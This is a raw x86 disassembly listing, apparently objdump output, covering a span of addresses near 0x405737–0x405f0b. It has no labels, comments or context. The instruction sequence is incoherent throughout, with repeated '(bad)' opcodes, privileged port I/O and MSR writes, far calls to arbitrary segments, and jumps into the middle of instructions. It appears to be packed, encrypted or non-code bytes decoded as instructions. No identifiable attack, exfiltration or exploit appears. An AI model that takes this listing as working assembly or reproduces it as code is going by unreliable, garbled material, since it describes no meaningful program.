  405737:	lea    edx,[edx-0x2a9b1855]
  40573d:	aaa    
  40573e:	push   ds
  40573f:	lahf   
  405740:	out    0x63,al
  405742:	xor    eax,0xebb6270b
  405747:	dec    esi
  405748:	sti    
  405749:	pushf  
  40574a:	sahf   
  40574b:	cdq    
  40574c:	repz add al,0x7a
  40574f:	cld    
  405750:	mov    al,0xbd
  405752:	mov    edx,0xbfed1bdc
  405757:	scas   eax,DWORD PTR es:[edi]
  405758:	scas   al,BYTE PTR es:[edi]
  405759:	enter  0x61dd,0xb3
  40575d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40575e:	cmp    DWORD PTR [eax+ebp*8+0x237e060e],edx
  405765:	arpl   WORD PTR [ebp+0x66196cb7],cx
  40576b:	mov    eax,0x688555fb
  405770:	out    dx,eax
  405771:	sub    BYTE PTR [ebx],dh
  405773:	adc    cl,ch
  405775:	push   cs
  405776:	cmc    
  405777:	xchg   edi,eax
  405778:	ret    
  405779:	(bad)
  40577d:	pusha  
  40577e:	and    ebp,DWORD PTR [esp+eiz*2]
  405781:	aam    0x8
  405783:	lea    esp,[ebx+0x3d]
  405786:	scas   eax,DWORD PTR es:[edi]
  405787:	add    ch,cl
  405789:	push   0xfffffff9
  40578b:	scas   al,BYTE PTR es:[edi]
  40578c:	or     DWORD PTR ds:0xc3728b0f,ebp
  405792:	add    DWORD PTR [ebp+0x47b507d6],0x6f4fa7d7
  40579c:	push   eax
  40579d:	or     DWORD PTR [esi+eax*4+0x64],esp
  4057a1:	jl     0x405749
  4057a3:	lock mov ?,WORD PTR [edx]
  4057a6:	and    BYTE PTR [esi],dl
  4057a8:	mov    ebx,0xceb500fa
  4057ad:	cld    
  4057ae:	mov    cl,0xb3
  4057b0:	cmp    BYTE PTR [ecx+ecx*2],al
  4057b3:	pop    edi
  4057b4:	(bad)  
  4057b5:	stos   BYTE PTR es:[edi],al
  4057b6:	mov    dh,0xdd
  4057b8:	fidiv  DWORD PTR [ebx]
  4057ba:	jg     0x405745
  4057bc:	jl     0x4057ec
  4057be:	sbb    esi,DWORD PTR [ecx+0x6d]
  4057c1:	mov    dl,0x36
  4057c3:	test   eax,0xb2d7d6e9
  4057c8:	pop    esp
  4057c9:	dec    edx
  4057ca:	xchg   DWORD PTR [ebp-0x55270096],edi
  4057d0:	push   0x18f947c2
  4057d5:	lods   eax,DWORD PTR ds:[esi]
  4057d6:	sub    ah,BYTE PTR [ebp*8-0x7324cfdf]
  4057dd:	mov    WORD PTR [ebx+0x27],fs
  4057e0:	xor    DWORD PTR [ecx+0x5b2f0d90],edx
  4057e6:	xrelease xchg DWORD PTR [ebx+0x5410161c],edi
  4057ed:	mov    esi,0xb768f9e6
  4057f2:	imul   eax,DWORD PTR ds:0x799ab35e,0x7c
  4057f9:	pop    ss
  4057fa:	lea    edx,[edi+0x56]
  4057fd:	or     dl,BYTE PTR [ecx]
  4057ff:	mov    al,0x6
  405801:	xor    DWORD PTR ds:0x4a334db4,edx
  405807:	xchg   ebx,eax
  405808:	xchg   edi,eax
  405809:	fdiv   QWORD PTR [ebx-0x2458ec7c]
  40580f:	cwde   
  405810:	mov    al,BYTE PTR [ebx-0x793234cb]
  405816:	cmp    dh,ah
  405818:	mov    bl,0xf
  40581a:	jno    0x4057cc
  40581c:	cmc    
  40581d:	xchg   DWORD PTR [ebp+0x22],ecx
  405820:	lods   eax,DWORD PTR ds:[esi]
  405821:	lahf   
  405822:	sbb    dh,BYTE PTR [ebp+0x1d]
  405825:	dec    edx
  405826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405827:	psrad  mm6,QWORD PTR [ecx-0x1f]
  40582b:	(bad)  
  40582c:	xor    BYTE PTR [ebp-0x66],dl
  40582f:	cli    
  405830:	sbb    ebp,edi
  405832:	add    bh,BYTE PTR [edi-0x38]
  405835:	inc    ebx
  405836:	xor    BYTE PTR [edi-0x4f7a6587],bl
  40583c:	inc    edx
  40583d:	mov    ch,0x22
  40583f:	lds    esi,FWORD PTR [ebp-0x3]
  405842:	imul   ebx,DWORD PTR [edx-0x6889a13],0x4b8e4deb
  40584c:	jno    0x40589c
  40584e:	mov    ds:0x54f8e1ba,al
  405853:	cld    
  405854:	ret    
  405855:	std    
  405856:	xor    ecx,DWORD PTR [edx-0x133fdda2]
  40585c:	jecxz  0x405852
  40585e:	mov    ah,0xd1
  405860:	(bad)  
  405861:	out    0x17,al
  405863:	in     al,0x98
  405865:	shr    BYTE PTR [ebx-0x76132b1d],0x50
  40586c:	cdq    
  40586d:	and    BYTE PTR [esi+0x8],0xb0
  405871:	inc    edx
  405872:	hlt    
  405873:	test   BYTE PTR [esi+edx*8],0x21
  405877:	inc    esi
  405878:	bound  esi,QWORD PTR [ecx+0x2c75b7e3]
  40587e:	sub    dh,BYTE PTR [ecx]
  405880:	data16 js 0x4058d7
  405883:	dec    edi
  405884:	cmp    al,0x6e
  405886:	xor    al,0xd2
  405888:	test   al,al
  40588a:	mov    eax,ds:0xb22dd8be
  40588f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405890:	test   eax,0x5612c9ec
  405895:	pop    edx
  405896:	outs   dx,DWORD PTR ds:[esi]
  405897:	out    0x57,al
  405899:	scas   eax,DWORD PTR es:[edi]
  40589a:	inc    eax
  40589b:	test   ebx,esi
  40589d:	push   es
  40589e:	test   DWORD PTR [edi+eiz*2-0x31],edi
  4058a2:	sbb    eax,0x827cdea4
  4058a7:	or     dh,dl
  4058a9:	jle    0x4058de
  4058ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ac:	xchg   ebp,eax
  4058ad:	jg     0x4058e9
  4058af:	xchg   esi,eax
  4058b0:	jmp    0x405879
  4058b2:	xchg   esi,eax
  4058b3:	ss in  eax,dx
  4058b5:	pop    ss
  4058b6:	jno    0x4058df
  4058b8:	aas    
  4058b9:	push   ecx
  4058ba:	ss mov ebx,0xdb51a7f1
  4058c0:	jno    0x405894
  4058c2:	lods   al,BYTE PTR ds:[esi]
  4058c3:	pop    ebp
  4058c4:	das    
  4058c5:	inc    ecx
  4058c7:	add    DWORD PTR [edx+edx*2+0x45],ebp
  4058cb:	sbb    DWORD PTR [edi+0x61],edi
  4058ce:	or     al,0x1a
  4058d0:	xchg   esp,eax
  4058d1:	out    0xed,al
  4058d3:	push   cs
  4058d4:	or     dh,al
  4058d6:	xchg   ecx,eax
  4058d7:	stos   DWORD PTR es:[edi],eax
  4058d8:	cmp    al,0x6d
  4058da:	(bad)  
  4058db:	mov    bh,0x38
  4058dd:	jbe    0x405953
  4058df:	ss sbb bh,dl
  4058e2:	adc    ebp,edi
  4058e4:	cmc    
  4058e5:	add    BYTE PTR [ecx+0x477671bc],bl
  4058eb:	pop    esp
  4058ec:	arpl   bx,bx
  4058ee:	fwait
  4058ef:	xchg   edi,eax
  4058f0:	xlat   BYTE PTR ds:[ebx]
  4058f1:	add    esp,esp
  4058f3:	repnz imul ebx,DWORD PTR [esi+0x4],0xfffffff1
  4058f8:	dec    ebp
  4058f9:	xlat   BYTE PTR ds:[ebx]
  4058fa:	sub    BYTE PTR [eax+eax*4+0x688611d4],0x16
  405902:	sahf   
  405903:	ret    0x5d49
  405906:	inc    ebx
  405907:	sar    esi,0xdd
  40590a:	xchg   ecx,eax
  40590b:	cli    
  40590c:	jb     0x405952
  40590e:	(bad)  
  40590f:	adc    ebp,edx
  405911:	and    al,0x69
  405913:	mov    ds:0x7251badb,al
  405918:	je     0x40591a
  40591a:	arpl   WORD PTR [edx+0x2c],bx
  40591d:	or     ah,0x51
  405920:	retf   
  405921:	cmp    al,BYTE PTR [ecx]
  405923:	pop    edi
  405924:	jbe    0x4058f1
  405926:	adc    cl,BYTE PTR [edx-0x7e]
  405929:	shl    BYTE PTR [edx+eax*1],0x7b
  40592d:	lahf   
  40592e:	mov    eax,0xccf56915
  405933:	cmp    ah,cl
  405935:	loopne 0x40598e
  405937:	in     eax,0xc0
  405939:	mov    edi,0x81f70dc8
  40593e:	and    eax,0x99f8e836
  405943:	lods   al,BYTE PTR ds:[esi]
  405944:	or     BYTE PTR [ebp-0x19],ch
  405947:	mov    esp,0x5e8ebab6
  40594c:	out    0xb,eax
  40594e:	jl     0x405984
  405950:	adc    BYTE PTR [eax],dh
  405952:	cld    
  405953:	pop    edx
  405954:	test   ecx,esi
  405956:	int    0xeb
  405958:	ret    0x6c21
  40595b:	(bad)  
  40595c:	int    0x4e
  40595e:	(bad)  
  40595f:	mov    ah,0x2c
  405961:	push   0xe920d55a
  405966:	jns    0x405918
  405968:	ds int 0x4c
  40596b:	mov    eax,ds:0xa8fc75e5
  405970:	or     DWORD PTR [ecx-0x58],edi
  405973:	push   ss
  405974:	cwde   
  405975:	(bad)  
  405977:	hlt    
  405978:	sbb    BYTE PTR [edx],0xa9
  40597b:	pop    esp
  40597c:	ror    BYTE PTR [ecx],1
  40597e:	adc    al,0xf4
  405980:	(bad)  
  405981:	leave  
  405982:	fisttp QWORD PTR [ecx]
  405984:	adc    esi,eax
  405986:	in     eax,0x9c
  405988:	sub    ebp,DWORD PTR [eax-0x61]
  40598b:	and    al,0x70
  40598d:	add    eax,0x97bd7494
  405992:	cmp    DWORD PTR [ebp-0x5764a2ba],0x34
  405999:	cwde   
  40599a:	sub    DWORD PTR ds:0x1dd8dddd,ecx
  4059a0:	jge    0x4059aa
  4059a2:	(bad)  
  4059a3:	sbb    ecx,edx
  4059a5:	in     eax,0xba
  4059a7:	mov    esi,es
  4059a9:	and    DWORD PTR [eax-0x36b7e531],edi
  4059af:	mov    bh,BYTE PTR [ecx-0x70640ed]
  4059b5:	dec    ecx
  4059b6:	xlat   BYTE PTR ds:[ebx]
  4059b7:	xchg   ebx,eax
  4059b8:	daa    
  4059b9:	jecxz  0x405950
  4059bb:	jnp    0x4059e4
  4059bd:	out    dx,eax
  4059be:	(bad)  
  4059c0:	xchg   DWORD PTR [esi-0xc],esi
  4059c3:	fild   DWORD PTR [edx+0x4e]
  4059c6:	push   0x0
  4059c8:	add    esp,DWORD PTR [ebx-0x8]
  4059cb:	xchg   edx,eax
  4059cc:	jmp    0x4059ea
  4059ce:	lds    ebx,FWORD PTR [eax-0x4]
  4059d1:	(bad)  
  4059d2:	fcom   QWORD PTR [ecx-0x7]
  4059d5:	lahf   
  4059d6:	jne    0x405a50
  4059d8:	mov    WORD PTR [eax],es
  4059da:	mov    ?,WORD PTR [esi-0x76c99373]
  4059e0:	or     dh,BYTE PTR [esi]
  4059e2:	xor    esp,0x98515faf
  4059e8:	mov    ch,0x1c
  4059ea:	outs   dx,DWORD PTR ds:[esi]
  4059eb:	sbb    bh,cl
  4059ed:	ret    0x5c59
  4059f0:	inc    edi
  4059f1:	xor    DWORD PTR [si],ebx
  4059f4:	lds    ecx,FWORD PTR [edi+0x12758cb9]
  4059fa:	out    dx,eax
  4059fb:	call   0xc341:0xad874118
  405a02:	xchg   DWORD PTR [esp+edi*2+0x20fcc589],esi
  405a09:	and    DWORD PTR [edx-0x7e2adc8f],ebp
  405a0f:	push   ss
  405a10:	mov    bl,0x6d
  405a12:	or     BYTE PTR [edx-0x1fe85928],bh
  405a18:	in     eax,0x52
  405a1a:	(bad)  
  405a1b:	xchg   esi,eax
  405a1c:	dec    edx
  405a1d:	mov    edx,0x2d1a9800
  405a22:	and    al,0xe7
  405a24:	dec    ebp
  405a25:	loopne 0x405a90
  405a27:	scas   al,BYTE PTR es:[edi]
  405a28:	mov    esp,0xe07aaaaa
  405a2d:	pop    edi
  405a2e:	loopne 0x405a6f
  405a30:	retf   0xb795
  405a33:	adc    ch,BYTE PTR [esi]
  405a35:	adc    DWORD PTR [esi+edx*8+0x2c4f6198],esp
  405a3c:	(bad)  
  405a3e:	mov    edx,0x554708b3
  405a43:	fstp   QWORD PTR [ecx]
  405a45:	mov    eax,0x69b87559
  405a4a:	(bad)
  405a4d:	in     al,dx
  405a4e:	add    al,0x62
  405a50:	pop    eax
  405a51:	fisttp WORD PTR [eax+0x60]
  405a54:	pop    edi
  405a55:	ret    
  405a56:	nop
  405a57:	inc    edi
  405a58:	aaa    
  405a59:	mov    al,ds:0xafa6b11e
  405a5e:	mov    ebx,ecx
  405a60:	in     eax,0x71
  405a62:	cmp    cl,BYTE PTR [edx]
  405a64:	fwait
  405a65:	push   ebp
  405a66:	in     eax,dx
  405a67:	icebp  
  405a68:	mov    edi,0xaa995794
  405a6d:	cmp    BYTE PTR [esi],bh
  405a6f:	xchg   esi,eax
  405a70:	ss rol al,1
  405a73:	mov    ebx,0x36b3d9e4
  405a78:	data16 mov dh,BYTE PTR [edi-0x56]
  405a7c:	je     0x405a82
  405a7e:	inc    edx
  405a7f:	xchg   esi,eax
  405a80:	ret    0x219
  405a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a85:	and    eax,0x5417e35a
  405a8a:	inc    edx
  405a8b:	cmp    ecx,eax
  405a8d:	xchg   BYTE PTR [edi-0x4fb696f2],bh
  405a93:	rcr    BYTE PTR [eax],0xd8
  405a96:	les    edi,FWORD PTR [ebx-0x10d33eb3]
  405a9c:	scas   eax,DWORD PTR es:[edi]
  405a9d:	pop    es
  405a9e:	adc    eax,0x9fe76840
  405aa3:	push   eax
  405aa4:	shr    eax,cl
  405aa6:	push   ss
  405aa7:	adc    eax,0xf3291cfe
  405aac:	add    dh,BYTE PTR ds:0x2c14568d
  405ab2:	mov    eax,ds:0x4f7e8f55
  405ab7:	xchg   edx,eax
  405ab8:	das    
  405ab9:	out    dx,al
  405aba:	xor    eax,0xea09e530
  405abf:	sahf   
  405ac0:	mov    dl,0x16
  405ac2:	shl    DWORD PTR [edx],0x17
  405ac5:	sbb    DWORD PTR [edx+0x4aa75f0b],ebp
  405acb:	cmp    eax,0x894074fe
  405ad0:	push   ds
  405ad1:	add    al,0xba
  405ad3:	sbb    eax,0xc25d55a0
  405ad8:	jecxz  0x405aae
  405ada:	shr    BYTE PTR [esi+0x3ddc8712],1
  405ae0:	pushf  
  405ae1:	add    BYTE PTR [edx+0x37325580],ah
  405ae7:	(bad)  
  405ae8:	int3   
  405ae9:	mov    cl,0x98
  405aeb:	pushf  
  405aec:	jbe    0x405b0b
  405aee:	mov    ecx,DWORD PTR [edi+0x6b7ef52b]
  405af4:	ins    BYTE PTR es:[edi],dx
  405af5:	aam    0x60
  405af7:	and    ebp,DWORD PTR [edi]
  405af9:	mov    ch,0x69
  405afb:	push   cs
  405afc:	mov    dl,0x14
  405afe:	xchg   edx,eax
  405aff:	rcl    BYTE PTR [edx-0x1abf7cde],0xdd
  405b06:	hlt    
  405b07:	loope  0x405b46
  405b09:	dec    ebx
  405b0a:	popf   
  405b0b:	test   BYTE PTR [ecx-0x49],bh
  405b0e:	in     al,0x76
  405b10:	pushw  0x2a
  405b13:	and    BYTE PTR [ecx+esi*2+0x819c0e1],dl
  405b1a:	cmp    ecx,edi
  405b1c:	fistp  WORD PTR ss:[edi]
  405b1f:	add    dh,BYTE PTR [ecx-0x14]
  405b22:	push   cs
  405b23:	jl     0x405b06
  405b25:	dec    edx
  405b26:	mov    dh,0x3d
  405b28:	and    eax,0x2424fd11
  405b2d:	stos   BYTE PTR es:[edi],al
  405b2e:	mov    ?,esp
  405b30:	xor    al,0x4a
  405b32:	stos   DWORD PTR es:[edi],eax
  405b33:	int3   
  405b34:	push   ds
  405b35:	imul   edi,DWORD PTR [ebx+edi*8-0x236cf6af],0xfbc135af
  405b40:	test   al,0x48
  405b42:	cli    
  405b43:	push   esp
  405b44:	not    ebp
  405b46:	popa   
  405b47:	popf   
  405b48:	xchg   ebx,eax
  405b49:	cmp    DWORD PTR [eax],ebp
  405b4b:	add    bl,BYTE PTR [ebx+0x4a]
  405b4e:	or     eax,0x23b47a5a
  405b53:	cli    
  405b54:	rcr    BYTE PTR cs:[edi+0x39cf9794],1
  405b5b:	in     eax,dx
  405b5c:	sub    DWORD PTR [ecx-0x48978c8d],0xe33fd03f
  405b66:	mov    ah,0x2e
  405b68:	call   0xff30:0x8bc78934
  405b6f:	iret   
  405b70:	dec    esi
  405b71:	xchg   esp,eax
  405b72:	scas   al,BYTE PTR es:[edi]
  405b73:	mov    cl,0xaf
  405b75:	inc    ebx
  405b76:	ror    BYTE PTR [edx+0x4e],1
  405b79:	cmp    dl,BYTE PTR [ebx+0x783a33c6]
  405b7f:	inc    esi
  405b80:	push   cs
  405b81:	leave  
  405b82:	test   eax,0xa5e7db21
  405b87:	push   ebx
  405b88:	pop    esi
  405b89:	or     al,0xb5
  405b8b:	gs jno 0x405b5a
  405b8e:	jecxz  0x405b63
  405b90:	pop    esi
  405b91:	test   eax,0xd1547ce5
  405b96:	aas    
  405b97:	fcom   DWORD PTR [edi+eiz*1+0x3bcca09d]
  405b9e:	inc    edi
  405b9f:	push   esi
  405ba0:	dec    ecx
  405ba1:	jns    0x405b93
  405ba3:	dec    esi
  405ba4:	push   ss
  405ba5:	call   0x6636cb32
  405baa:	inc    ebx
  405bab:	dec    eax
  405bad:	bound  ebp,QWORD PTR [ebp-0x7211cf75]
  405bb3:	leave  
  405bb4:	mov    ebp,0xfc7a00fe
  405bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bba:	jae    0x405bdd
  405bbc:	dec    ebx
  405bbd:	std    
  405bbe:	pop    ebx
  405bbf:	push   ebp
  405bc0:	adc    dh,BYTE PTR [ebx+0x23]
  405bc3:	mov    eax,ds:0x78937672
  405bc8:	or     eax,0xba75819f
  405bcd:	aam    0x71
  405bcf:	lds    edx,FWORD PTR [eax]
  405bd1:	mov    dh,0xe
  405bd3:	bound  edx,QWORD PTR [ebp+0x31]
  405bd6:	dec    edx
  405bd7:	(bad)  
  405bd9:	mov    edi,DWORD PTR [edi-0x7d964f2a]
  405bdf:	dec    edx
  405be0:	dec    edx
  405be1:	shl    BYTE PTR [edx-0x6f],1
  405be4:	int3   
  405be5:	cmp    esp,DWORD PTR [ebp-0x3de639a5]
  405beb:	inc    ecx
  405bec:	retf   0x3fda
  405bef:	sbb    eax,0x800ec92a
  405bf4:	mov    BYTE PTR [edi+0x2cede1fa],cl
  405bfa:	sub    cl,BYTE PTR [ecx-0x38]
  405bfd:	aaa    
  405bfe:	iret   
  405bff:	pop    ebx
  405c00:	out    dx,eax
  405c01:	or     eax,0x5560cfea
  405c06:	(bad)  
  405c07:	xor    cl,BYTE PTR [edx-0x58a3cce8]
  405c0d:	retf   0x6da7
  405c10:	scas   eax,DWORD PTR es:[edi]
  405c11:	and    DWORD PTR [edx+0x4e38c7c],ecx
  405c17:	xchg   ebx,eax
  405c18:	fdiv   DWORD PTR [edx-0x645f3f11]
  405c1e:	pop    ds
  405c1f:	mov    ch,0xb1
  405c21:	inc    ecx
  405c22:	mov    ds:0x9afdc3b,al
  405c27:	wrmsr  
  405c29:	nop
  405c2a:	ins    BYTE PTR es:[edi],dx
  405c2b:	push   cs
  405c2c:	in     eax,0x72
  405c2e:	in     al,dx
  405c2f:	inc    esp
  405c30:	dec    ebx
  405c31:	or     al,0x1a
  405c33:	(bad)  
  405c34:	popa   
  405c35:	imul   ebx,DWORD PTR [ecx+0x5795e225],0x5ec5ae53
  405c3f:	xor    eax,0x19862ea4
  405c44:	into   
  405c45:	inc    ebx
  405c46:	mov    eax,ds:0x93bf0001
  405c4b:	jbe    0x405ca3
  405c4d:	and    BYTE PTR [edx+ecx*4+0x50519a66],ch
  405c54:	adc    bh,ch
  405c56:	dec    ecx
  405c57:	ins    DWORD PTR es:[edi],dx
  405c58:	mov    dh,0x25
  405c5a:	or     DWORD PTR [esi+0x21],ebp
  405c5d:	jo     0x405c94
  405c5f:	push   ebx
  405c60:	or     dl,BYTE PTR [eax]
  405c62:	push   ds
  405c63:	cmp    edi,edx
  405c65:	jns    0x405bee
  405c67:	xor    DWORD PTR [eax],esi
  405c69:	xchg   DWORD PTR [esi],edi
  405c6b:	loop   0x405cde
  405c6d:	or     al,0x96
  405c6f:	gs mov eax,0x284837cb
  405c75:	fwait
  405c76:	sbb    eax,0x5314606c
  405c7b:	ss push eax
  405c7d:	xor    eax,0x91581fcb
  405c82:	and    eax,0xc3779bde
  405c87:	(bad)  
  405c88:	stos   BYTE PTR es:[edi],al
  405c89:	addr16 fcmovb st,st(7)
  405c8c:	push   ss
  405c8d:	sbb    al,dl
  405c8f:	int    0xca
  405c91:	adc    esi,ecx
  405c93:	ficomp WORD PTR [ebx]
  405c95:	fadd   QWORD PTR [edi]
  405c97:	(bad)  
  405c99:	and    al,0x4e
  405c9b:	add    eax,0xfb1174d0
  405ca0:	ins    BYTE PTR es:[edi],dx
  405ca1:	aam    0xf2
  405ca3:	xchg   edx,eax
  405ca4:	fld    TBYTE PTR [ebp+0x1d8ec2aa]
  405caa:	js     0x405cb4
  405cac:	mov    ebp,0xeff22416
  405cb1:	ja     0x405c35
  405cb3:	push   ds
  405cb4:	or     al,0x30
  405cb6:	(bad)  
  405cb7:	jb     0x405cda
  405cb9:	sbb    al,0xf3
  405cbb:	clc    
  405cbc:	sub    al,0x49
  405cbe:	enter  0xb82,0xf2
  405cc2:	lea    edi,[esi]
  405cc4:	aas    
  405cc5:	pop    es
  405cc6:	or     esi,DWORD PTR [eax]
  405cc8:	sbb    eax,0x668692d6
  405ccd:	cmc    
  405cce:	stc    
  405ccf:	and    al,0xbe
  405cd1:	ret    0x4839
  405cd4:	ds mov ah,0xc2
  405cd7:	(bad)  
  405cd8:	out    dx,eax
  405cd9:	push   edx
  405cda:	or     ecx,DWORD PTR [ebx]
  405cdc:	jl     0x405cfd
  405cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cdf:	test   BYTE PTR [ebp-0x56],0xe9
  405ce3:	sbb    ebx,0xf40d2ce9
  405ce9:	mov    al,ds:0x131a0fdb
  405cee:	imul   esi,DWORD PTR [edi+0x145f33cc],0xc
  405cf5:	outs   dx,BYTE PTR ds:[esi]
  405cf6:	sti    
  405cf7:	ret    0xd1f9
  405cfa:	les    eax,FWORD PTR [esi]
  405cfc:	shr    BYTE PTR [esi+0x5d],0x6b
  405d00:	push   ds
  405d01:	xor    al,0x56
  405d03:	sub    edx,esp
  405d05:	(bad)  
  405d07:	mov    al,0x2
  405d09:	lock jg 0x405d57
  405d0c:	mov    esp,0xe4ff1ef7
  405d11:	xchg   edx,eax
  405d12:	pushf  
  405d13:	cmp    dh,BYTE PTR [esi]
  405d15:	das    
  405d16:	enter  0xb5ec,0x30
  405d1a:	clc    
  405d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d1c:	push   es
  405d1d:	push   edx
  405d1e:	adc    eax,0x6e331e19
  405d23:	sub    eax,0xe27d10e3
  405d28:	sub    ebx,edx
  405d2a:	inc    esp
  405d2b:	outs   dx,DWORD PTR ds:[esi]
  405d2c:	pop    edx
  405d2d:	sub    ah,bl
  405d2f:	pop    edx
  405d30:	(bad)  
  405d31:	fnstsw WORD PTR [esi+0x2]
  405d34:	inc    esi
  405d35:	enter  0x3e21,0x67
  405d39:	push   esi
  405d3a:	stc    
  405d3b:	add    edi,edx
  405d3d:	dec    DWORD PTR [ebp+0x1e]
  405d40:	in     al,0x44
  405d42:	into   
  405d43:	adc    bh,BYTE PTR [eax]
  405d45:	in     al,dx
  405d46:	(bad)  [ebx]
  405d48:	adc    DWORD PTR [ebx],eax
  405d4a:	xor    ecx,DWORD PTR [edx]
  405d4c:	and    dl,BYTE PTR [ebx]
  405d4e:	sub    edi,DWORD PTR [ecx]
  405d50:	fwait
  405d51:	clc    
  405d52:	arpl   WORD PTR [eax-0x68b148a9],dx
  405d58:	xchg   esp,eax
  405d59:	add    al,0x84
  405d5b:	ins    DWORD PTR es:[edi],dx
  405d5c:	xchg   ebp,eax
  405d5d:	sub    ecx,ebp
  405d5f:	push   ds
  405d60:	pop    ds
  405d61:	dec    edx
  405d62:	adc    DWORD PTR [edi-0x24],esi
  405d65:	pop    ds
  405d66:	(bad)  
  405d67:	dec    esp
  405d68:	jp     0x405d75
  405d6a:	mov    ecx,0x923e428b
  405d6f:	and    eax,0xab81aef1
  405d74:	xor    ah,BYTE PTR ds:0xe662997c
  405d7a:	lea    edx,[ecx+0xad1de32]
  405d80:	stos   DWORD PTR es:[edi],eax
  405d81:	lods   eax,DWORD PTR ds:[esi]
  405d82:	in     eax,dx
  405d83:	aaa    
  405d84:	xchg   edx,eax
  405d85:	adc    eax,0xa2f8546e
  405d8a:	(bad)  
  405d8c:	stos   BYTE PTR es:[edi],al
  405d8d:	cdq    
  405d8e:	mov    ecx,0xe9476416
  405d93:	xor    eax,0x4f4c3845
  405d98:	sbb    bh,BYTE PTR [edx*8-0x7123646]
  405d9f:	push   esi
  405da0:	jl     0x405dbe
  405da2:	xor    al,BYTE PTR [edi+0x6a1aad90]
  405da8:	hlt    
  405da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405daa:	imul   edx,DWORD PTR ds:0x5fc9603a,0x70
  405db1:	and    ebp,edx
  405db3:	sbb    BYTE PTR [esi+0x1d399038],cl
  405db9:	shl    DWORD PTR [ebx],1
  405dbb:	dec    ecx
  405dbc:	(bad)  
  405dbd:	out    0xff,eax
  405dbf:	push   edi
  405dc0:	jge    0x405e2c
  405dc2:	repz retf 
  405dc4:	mov    al,ds:0xf7f8a5b8
  405dc9:	(bad)  
  405dca:	xlat   BYTE PTR ds:[ebx]
  405dcb:	or     cl,cl
  405dcd:	cld    
  405dce:	imul   edi,edi,0xffffffdf
  405dd1:	out    dx,al
  405dd2:	inc    ecx
  405dd3:	jmp    0x210c:0x6e48d336
  405dda:	and    BYTE PTR [ebp-0x5077a879],dh
  405de0:	int    0x83
  405de2:	imul   eax,edx,0x3db8866c
  405de8:	push   cs
  405de9:	jno    0x405ddc
  405deb:	dec    esp
  405dec:	pop    es
  405ded:	push   esp
  405dee:	and    cl,BYTE PTR [ebp+0x229e6b3e]
  405df4:	mov    dh,0x80
  405df6:	dec    edi
  405df7:	mov    eax,ds:0xa33464cf
  405dfc:	mov    cl,dh
  405dfe:	lock fdivr DWORD PTR [edx]
  405e01:	mov    bh,0x28
  405e03:	mov    bl,BYTE PTR [edi+0x1377e59c]
  405e09:	inc    esi
  405e0a:	mov    eax,ds:0x83730c84
  405e0f:	call   0x8894f9d5
  405e14:	pop    ebx
  405e15:	or     bh,BYTE PTR [edi+0x3b994db8]
  405e1b:	add    al,0x56
  405e1d:	dec    ecx
  405e1e:	and    al,0x68
  405e20:	push   cs
  405e21:	dec    esi
  405e22:	and    eax,0xf0078d61
  405e27:	push   0x32
  405e29:	adc    DWORD PTR [ebp-0x5aef9624],ebp
  405e2f:	mov    edx,0x3f70f50e
  405e34:	push   cs
  405e35:	mov    cl,0x34
  405e37:	mov    dh,0x89
  405e39:	sar    DWORD PTR ds:0x53183582,1
  405e3f:	mov    ebx,0x52cdcd13
  405e44:	popf   
  405e45:	mov    ebx,0xda1a2590
  405e4a:	div    DWORD PTR [esi-0x1e2a039]
  405e50:	int    0x28
  405e52:	data16 (bad) 
  405e54:	(bad)  
  405e55:	xlat   BYTE PTR ds:[ebx]
  405e56:	pop    ebp
  405e57:	(bad)
  405e5a:	ss sub esi,esp
  405e5d:	mov    edx,0xd4ca50bd
  405e62:	adc    DWORD PTR [eax+0x66],edi
  405e65:	push   ebp
  405e66:	test   BYTE PTR [esp+eiz*2],cl
  405e69:	cmp    ch,BYTE PTR [ebx]
  405e6b:	cmp    al,0x27
  405e6d:	addr16 adc al,0xe9
  405e70:	rcr    dl,0x26
  405e73:	faddp  st(1),st
  405e75:	adc    ebx,DWORD PTR [ebp+0x39d2d1f0]
  405e7b:	mov    edi,0xccacaecb
  405e80:	mov    dh,0xf7
  405e82:	out    0x5d,eax
  405e84:	and    al,0xa8
  405e86:	rol    BYTE PTR [ecx-0x2d5a3c18],1
  405e8c:	adc    ebp,DWORD PTR [edi]
  405e8e:	test   BYTE PTR [esi-0x5c],dh
  405e91:	push   ds
  405e92:	lds    ecx,FWORD PTR [edi]
  405e94:	pusha  
  405e95:	xor    bl,BYTE PTR es:[ecx+0x0]
  405e99:	mov    esi,DWORD PTR [esi-0x20712e4d]
  405e9f:	call   0x75b9:0xe4896005
  405ea6:	out    0x46,al
  405ea8:	test   BYTE PTR [edx],bh
  405eaa:	repz push esp
  405eac:	jbe    0x405e65
  405eae:	sub    edx,DWORD PTR ds:0x70c5f315
  405eb4:	leave  
  405eb5:	pop    es
  405eb6:	iret   
  405eb7:	sti    
  405eb8:	out    dx,al
  405eb9:	sub    dl,bh
  405ebb:	xor    ecx,ecx
  405ebd:	fwait
  405ebe:	(bad)  
  405ebf:	(bad)  
  405ec1:	or     eax,0xa9eafee1
  405ec6:	add    BYTE PTR [ebx-0xd0ae4b7],0x9f
  405ecd:	arpl   WORD PTR [esi],cx
  405ecf:	xchg   ebx,eax
  405ed0:	imul   esi,DWORD PTR [eax],0x23
  405ed3:	jl     0x405eb4
  405ed5:	pusha  
  405ed6:	add    ah,BYTE PTR [ebx+esi*1-0x7e29b99e]
  405edd:	fsubr  DWORD PTR [eax+0x19436ab3]
  405ee3:	add    eax,0x3062b671
  405ee8:	mov    bh,0x7c
  405eea:	or     cl,BYTE PTR [esi-0x302ba808]
  405ef0:	loopne 0x405f64
  405ef2:	mul    DWORD PTR fs:[esi+ecx*8+0x722030ac]
  405efa:	push   ds
  405efb:	mov    WORD PTR [edi+0x59dbd785],fs
  405f01:	jo     0x405f3f
  405f03:	sbb    BYTE PTR [ecx],dh
  405f05:	jp     0x405ea2
  405f07:	ja     0x405eda
  405f09:	ffreep st(1)
  405f0b:	fdivr  st,st(2)
